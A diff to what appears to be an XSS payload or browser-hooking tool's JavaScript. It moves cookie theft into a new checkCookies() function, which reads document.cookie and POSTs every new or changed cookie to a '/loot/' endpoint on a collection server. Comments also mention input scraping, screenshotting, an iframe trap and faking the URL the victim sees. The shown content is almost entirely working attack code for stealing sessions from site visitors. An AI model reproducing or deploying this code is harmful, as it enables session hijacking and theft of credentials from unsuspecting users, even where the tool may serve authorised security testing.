@@ -33,6 +33,11 @@ let loaded = false;
 // Client session
 var sessionName = "";
 
+// Cookie storage
+var cookieStorage ={};
+
+
+// Values for client session identifiers
 const AdjectiveList = [
 	"funky",
 	"smelly",
@@ -202,6 +207,55 @@ function hookInputs()
 
 
 
+// Check for cookies, see if values
+// have been added changed
+// Only update backend if new cookie or value changed.
+function checkCookies()
+{
+	cookieArray = document.cookie.split(';');
+	for (index = 0; index < cookieArray.length; index++)
+	{
+		// console.log("++ Cookie loop: " + index);
+		cookieData = cookieArray[index].split('=');
+		// console.log("cookieName: " + cookieData[0]);
+		// console.log("cookieValue: " + cookieData[1]);
+
+		cookieName = cookieData[0];
+		cookieValue = cookieData[1];
+		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);
+		if (cookieName in cookieStorage)
+		{
+			// console.log("== Existing cookie: " + cookieName);
+			if (cookieStorage[cookieName] != cookieValue)
+			{
+				// console.log("     New cookie value: " + cookieValue);
+				// console.log("     Old cookie value: " + cookieStorage[cookieName]);
+				cookieStorage[cookieName] = cookieValue;
+			}
+			else
+			{
+				// console.log("     Cookie value unchanged");
+				continue;
+			}
+		}
+		else
+		{
+			// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
+			cookieStorage[cookieName] = cookieValue;
+		}
+
+		request = new XMLHttpRequest();
+		request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
+		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+		var jsonObj = new Object();
+		jsonObj["cookieName"] = cookieData[0];
+		jsonObj["cookieValue"] = cookieData[1];
+		var jsonString = JSON.stringify(jsonObj);
+		request.send(jsonString);
+	}
+
+}
+
 
 
 // When this update fires, it checks the iframe trap URL
@@ -235,29 +289,10 @@ function runUpdate()
 		// Handle screenshotting
 		sendScreenshot();
 
-
 		// Handle input scraping
 		hookInputs();
-
-		// Handle Cookies
-		cookieArray = document.cookie.split(';');
-		for (index = 0; index < cookieArray.length; index++)
-		{
-			// console.log("++ Cookie loop: " + index);
-			cookieData = cookieArray[index].split('=');
-			// console.log("cookieName: " + cookieData[0]);
-			// console.log("cookieValue: " + cookieData[1]);
-
-			request = new XMLHttpRequest();
-			request.open("POST", "http://localhost:8444/loot/dessert/" + sessionName);
-			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-			var jsonObj = new Object();
-			jsonObj["cookieName"] = cookieData[0];
-			jsonObj["cookieValue"] = cookieData[1];
-			var jsonString = JSON.stringify(jsonObj);
-			request.send(jsonString);
-		}
 	}
+
 	// else
 	// 	console.log("Fake URL doesn't need updating");
 
@@ -265,7 +300,14 @@ function runUpdate()
 
 	// Updates that need to happen constantly
 	// hooking inputs, we can miss them otherwise
+	// hookInputs intelligently knows whether inputs
+	// need to be rehooked or not
 	hookInputs();
+
+
+	// Handle Cookies
+	// Will only report when new cookies found, or values change. 
+	checkCookies();
 
 
 	// Fake the URL that the user sees. This is important. 
